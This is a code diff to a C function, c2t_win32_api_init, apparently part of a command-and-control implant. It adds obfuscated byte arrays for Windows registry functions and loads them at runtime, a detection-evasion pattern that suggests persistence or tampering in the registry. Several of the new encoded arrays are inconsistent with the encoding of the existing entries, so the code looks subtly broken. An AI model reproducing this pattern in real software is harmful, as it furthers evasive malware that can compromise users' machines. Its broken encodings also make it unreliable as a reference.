@@ -266,6 +266,13 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_BCryptGenRandom[] = {24, 25, 40, 35, 42, 46, 29, 63, 52, 8, 59, 52, 62, 53, 55};
   static const unsigned char enc_BCryptCloseAlgorithmProvider[] = {24, 25, 40, 35, 42, 46, 25, 54, 53, 41, 63, 27, 54, 61, 53, 40, 51, 46, 50, 55, 10, 40, 53, 44, 51, 62, 63, 40};
 
+  /* advapi32 functions */
+  static const unsigned char enc_RegOpenKeyExA[] = {24, 63, 61, 21, 42, 63, 52, 1, 63, 51, 31, 34, 27};
+  static const unsigned char enc_RegSetValueExA[] = {24, 63, 61, 25, 63, 54, 20, 59, 54, 47, 63, 31, 34, 27};
+  static const unsigned char enc_RegDeleteValueA[] = {24, 63, 61, 30, 63, 54, 63, 54, 63, 20, 59, 54, 47, 63, 27};
+  static const unsigned char enc_RegQueryValueExA[] = {24, 63, 61, 27, 47, 63, 40, 51, 20, 59, 54, 47, 63, 31, 34, 27};
+  static const unsigned char enc_RegCloseKey[] = {24, 63, 61, 25, 54, 53, 41, 63, 1, 63, 51};
+
   /* shell32 functions */
   static const unsigned char enc_SHGetFolderPathW[] = {9, 18, 29, 63, 46, 28, 53, 54, 62, 63, 40, 10, 59, 46, 50, 13};
   static const unsigned char enc_DragQueryFileW[] = {30, 40, 59, 61, 11, 47, 63, 40, 35, 28, 51, 54, 63, 13};
@@ -498,6 +505,11 @@ void c2t_win32_api_init(void) {
 
   /* advapi32 */
   LOAD_API(hAdvapi32, RtlGenRandom, enc_SystemFunction036);
+  LOAD_API(hAdvapi32, RegOpenKeyExA, enc_RegOpenKeyExA);
+  LOAD_API(hAdvapi32, RegSetValueExA, enc_RegSetValueExA);
+  LOAD_API(hAdvapi32, RegDeleteValueA, enc_RegDeleteValueA);
+  LOAD_API(hAdvapi32, RegQueryValueExA, enc_RegQueryValueExA);
+  LOAD_API(hAdvapi32, RegCloseKey, enc_RegCloseKey);
 
   /* bcrypt */
   LOAD_API(hBcrypt, BCryptOpenAlgorithmProvider, enc_BCryptOpenAlgorithmProvider);
